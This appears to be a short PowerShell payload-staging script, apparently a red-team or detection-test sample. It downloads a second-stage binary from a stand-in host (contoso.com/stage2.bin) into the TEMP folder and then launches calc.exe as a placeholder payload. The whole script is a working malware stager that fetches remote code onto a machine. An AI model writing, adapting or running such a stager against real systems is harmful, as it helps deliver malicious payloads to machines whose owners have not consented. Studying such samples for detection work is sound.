
<# Payload staging #>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://contoso.com/stage2.bin',
    [string]$Stage2Path = "$env:TEMP\stage2.bin"
)
(New-Object System.Net.WebClient).DownloadFile($TransferUrl, $Stage2Path)
Start-Process -FilePath "calc.exe"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
